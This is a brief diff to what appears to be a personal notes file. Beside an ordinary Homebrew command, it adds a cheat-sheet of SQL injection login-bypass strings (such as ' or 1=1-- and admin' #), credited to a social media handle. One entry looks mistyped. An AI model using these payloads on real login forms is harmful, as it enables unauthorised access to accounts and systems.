@@ -5,4 +5,18 @@
 
 brew info --json=v1 --installed | jq ‘.[] | select(.keg_only == true) | .name'
 
+#############################
 
+# sql injection login examples from @NandanLohitaksh
+
+• admin' 
+• admin' # 
+• admin'/* 
+• ' or 1=1-- 
+• ' or 1=1# 
+• ' or 1=1/* 
+• ') or '1'='1-- 
+• ') or C11=11-- 
+
+
+#############################
